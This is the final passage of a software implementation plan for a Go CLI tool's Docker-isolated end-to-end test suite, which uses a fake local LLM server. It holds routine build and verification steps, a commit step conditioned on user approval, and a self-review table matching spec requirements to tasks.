`Dockerfile.e2e` and runs the suite inside the container, where `TestMain` builds
and installs the real binary to `/usr/local/bin/aka`. Each test gets a throwaway
`$HOME` and its own `fakellm` server; interactive flows are driven over a real PTY
(`test/e2e/pty.go`). `AKA_LLM_BASE_URL` (loopback-only, see
`internal/llm/baseurl.go`) is what points the real binary at the local server.

The suite refuses to run outside the container — it installs to `/usr/local/bin`
and would otherwise overwrite a developer's real `aka`.
```

Also correct the stale `aka uninit` section: the command is documented but not
registered in `cmd/aka/main.go`. Either mark it as planned-but-unimplemented or
remove the section — confirm the intended resolution with the user before editing.

- [ ] **Step 6: Full verification**

Run: `make e2e && go test -race -count=1 ./... && go build ./... && go vet ./... && gofmt -l .`
Expected: e2e suite PASSes, unit suite PASSes, no build/vet output, `gofmt -l` prints nothing.

- [ ] **Step 7: Run the local pre-push checks**

Run: `lefthook run pre-push`
Expected: `gofmt`, `go vet`, `golangci-lint`, and `govulncheck` all pass. Fix any lint findings using the patterns in the Global Constraints section.

- [ ] **Step 8: Stage (commit only if the user has approved committing)**

```bash
git add test/e2e/live_test.go test/e2e/harness.go .github/workflows/ci.yml CLAUDE.md
git commit -m "test(e2e): add opt-in live tier and CI job"
```

---

## Self-Review

**Spec coverage:**

| Spec requirement | Task |
|---|---|
| Docker isolation | 3 |
| Local protocol server | 6 |
| Optional live tier | 11 |
| PTY + expect harness, no new product flags | 4 |
| Go tests inside the container | 3 |
| `make e2e` + CI job on push | 3, 11 |
| `resolveBaseURL` with loopback guard | 1 |
| `WithBaseURL` on both providers | 2 |
| SECURITY-AUDIT.md entry | 1 |
| Shell wiring verified by a real shell | 7, 8 |
| Full scan lifecycle | 8 |
| Censoring proven at the wire | 9 |
| Hostile LLM responses | 10 |
| Back-navigation regression | 8 |
| `--history diff` makes no LLM call | 8 |
| Token-limit halving retry | 10 |
| Malformed response | 10 |
| `e2e`-prefixed fixture names | Global Constraints |

No gaps.

**Type consistency:** `Env` gains `LLM` in Task 6 and `ClearLLMOverride` in Task 11 — both flagged at their point of use. `fakellm.Suggestion`/`fakellm.Param` are used consistently across Tasks 6, 8, 10. `Console` methods (`Expect`, `ExpectRe`, `Send`, `SendLine`, `Wait`, `Screen`, `NotExpect`, `CountOccurrences`) are defined in Task 4 and used with the same names throughout. `runCommand` is introduced in Task 8 and reused in Task 10. `existingRC`, `seededEnv`, `realisticHistory`, `workflowSuggestions` are defined in Tasks 7–8 and reused later.

**Known deviations from the spec, both deliberate and flagged inline:**
1. `resolveBaseURL` lives in the provider constructors, not `buildProvider` — smaller diff, `internal/cli/scan.go` untouched.
2. The real-shell `type <alias>` proof lives in Task 8 (it needs applied aliases); Task 7 keeps a shell-startup validity check instead.

**Reconciliation steps are intentional.** Tasks 7–10 each include a step directing the implementer to correct *tests* against real product behaviour when an asserted string or keystroke turns out to differ, and to report genuine bugs rather than fix them mid-task. Exact prompt strings were read from the source while writing this plan, but keystroke choreography in `reviewListModel` is the one area where live verification is required.
